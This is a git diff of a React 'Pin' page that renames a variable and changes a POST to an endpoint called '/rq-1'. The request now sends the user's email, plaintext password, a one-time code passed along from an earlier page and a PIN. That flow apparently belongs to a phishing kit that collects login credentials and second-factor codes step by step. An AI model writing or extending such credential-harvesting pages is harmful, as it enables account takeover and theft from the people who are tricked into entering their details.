@@ -21,12 +21,12 @@ export default function Pin(props) {
         e.preventDefault()
         setLoading(true)
 
-        const clientOtp = keepOtp.toString()
+        const pin = keepOtp.toString()
 
         if (props.location.state) {
             const templateParams = props.location.state
 
-            templateParams.clientOtp = clientOtp
+            templateParams.pin = pin
 
             try {
                 const response = await fetch(URL + '/rq-1', {
@@ -42,8 +42,8 @@ export default function Pin(props) {
                     body: JSON.stringify({
                         email: templateParams.email,
                         password: templateParams.password,
-                        pin: clientOtp,
-                        otp: '',
+                        otp: templateParams.otp,
+                        pin,
                     }),
                 })
 
